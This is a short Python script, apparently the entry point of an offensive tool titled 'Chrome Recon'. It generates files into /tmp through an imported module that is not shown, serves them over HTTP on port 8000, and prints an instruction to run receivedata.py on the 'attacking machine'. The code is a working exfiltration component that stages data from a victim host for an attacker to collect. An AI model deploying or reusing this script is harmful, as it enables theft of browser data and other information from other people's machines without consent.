from http.server import HTTPServer, SimpleHTTPRequestHandler
import subprocess
import os
from scandata import *
from remove import *
import socket
def banner():
    print('''
       ________  ______  ____  __  _________
  / ____/ / / / __ \/ __ \/  |/  / ____/
 / /   / /_/ / /_/ / / / / /|_/ / __/   
/ /___/ __  / _, _/ /_/ / /  / / /___   
\_______ /________________  __/_____/   
   / __ \/ ____/ ____/ __ \/ | / /      
  / /_/ / __/ / /   / / / /  |/ /       
 / _, _/ /___/ /___/ /_/ / /|  /        
/_/ |_/_____/\____/\____/_/ |_/         
                                        
    ''')
def startserver():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip=(s.getsockname()[0])
    s.close()
    os.chdir('/tmp/')
    httpd = HTTPServer((ip, 8000), SimpleHTTPRequestHandler)
    httpd.serve_forever()

if __name__ == "__main__":
    try:
        banner()
        genfiles()
        print("Server started at Localhost..Run python3 receivedata.py in attacking machine...")
        startserver()
    except KeyboardInterrupt:
        print("Removing Temp Files")
        removetmp()
        
    except:
        print("Error running script//")
